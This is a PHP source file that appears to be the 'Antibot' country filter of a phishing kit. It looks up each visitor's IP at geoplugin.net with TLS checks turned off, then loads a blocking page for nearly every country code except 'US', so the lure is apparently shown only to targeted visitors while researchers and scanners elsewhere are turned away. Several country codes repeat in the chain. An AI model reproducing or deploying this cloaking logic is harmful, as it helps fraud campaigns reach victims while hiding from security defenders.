<?php

$tanitatikaram = parse_ini_file("php.ini",true);
$setting_country = $tanitatikaram['setting_country'];
if ($setting_country == 'on') {
$ip = getenv("REMOTE_ADDR");
$url = "http://www.geoplugin.net/json.gp?ip=".$ip;
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
$resp = curl_exec($ch);
curl_close($ch);
$details = json_decode($resp,true);
$countrycode = $details['geoplugin_countryCode'];
if ($countrycode == "NL") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "A1") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "AD") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "AE") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "AF") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "AG") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "AI") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "AL") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "AM") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "AN") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "AO") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "AP") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "AQ") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "AR") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "AS") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "AT") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "AU") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "AW") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "AX") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "AZ") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "BA") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "BB") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "BD") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "BE") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "BD") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "BE") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "BF") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "BG") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "BH") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "BI") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "BJ") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "BM") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "BN") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "BO") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "BR") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "BS") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "BT") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "BV") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "BV") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "BW") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "BY") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "BZ") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "CA") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "CC") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "CD") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "CF") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "CG") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "CH") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "CI") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "CK") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "CL") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "CM") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "CN") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "CO") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "CR") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "CU") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "CV") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "CX") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "CY") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "CZ") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "DE") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "DJ") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "DK") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "DM") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "DO") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "DZ") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "EC") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "EE") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "EG") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "EH") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "ER") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "ES") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "ET") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "EU") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "FI") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "FJ") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "FK") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "FM") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "FO") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "FR") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "GA") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "GB") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "GD") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "GE") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "GF") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "GG") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "GH") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "GI") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "GL") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "GM") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "GN") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "GP") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "GQ") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "GR") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "GS") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "GT") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "GU") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "GW") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "GY") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "HK") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "HM") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "HN") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "HR") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "HT") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "HU") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "ID") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "IE") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "IL") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "IM") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "IN") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "IO") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "IQ") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "IR") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "IS") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "IT") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "JE") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "JM") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "JO") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "JP") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "KE") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "KG") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "KH") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "KI") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "KM") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "KN") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "KP") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "KR") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "KW") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "KY") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "KZ") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "LA") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "LB") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "LC") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "LI") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "LK") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "LR") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "LS") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "LT") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "LU") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "LV") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "LY") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "MA") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "MC") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "MD") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "ME") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "MG") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "MH") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "MK") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "ML") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "MM") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "MN") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "MO") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "MP") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "MQ") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "MR") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "MQ") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "MR") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "MS") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "MT") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "MU") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "MV") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "MW") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "MX") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "MY") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "MZ") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "NA") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "NC") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "NE") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "NF") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "NG") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "NI") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "NO") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "NP") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "NR") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "NU") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "NZ") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "OM") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "PA") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "PE") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "PF") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "PG") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "PH") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "PK") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "PL") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "PM") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "PN") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "PR") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "PS") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "PT") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "PW") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "PY") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "QA") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "RE") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "RO") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "RS") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "RU") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "RW") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "SA") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "SB") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "SC") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "SD") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "SE") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "SG") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "SH") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "SI") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "SJ") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "SK") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "SL") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "SM") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "SN") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "SO") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "SR") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "ST") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "SV") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "SY") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "SZ") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "TC") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "TD") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "TF") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "TG") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "TH") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "TJ") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "TK") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "TL") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "TM") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "TN") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "TO") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "TR") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "TT") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "TV") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "TW") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "TZ") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "UA") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "UG") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "UM") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "UY") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "UZ") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "VA") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "VC") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "VE") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "VG") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "VI") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "VN") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "VU") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "WF") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "WS") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "YE") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "YT") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "ZA") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "ZM") {
header(require 'Antibot/Antibotcountry.php');
}else if ($countrycode == "ZW") {
header(require 'Antibot/Antibotcountry.php');
}
};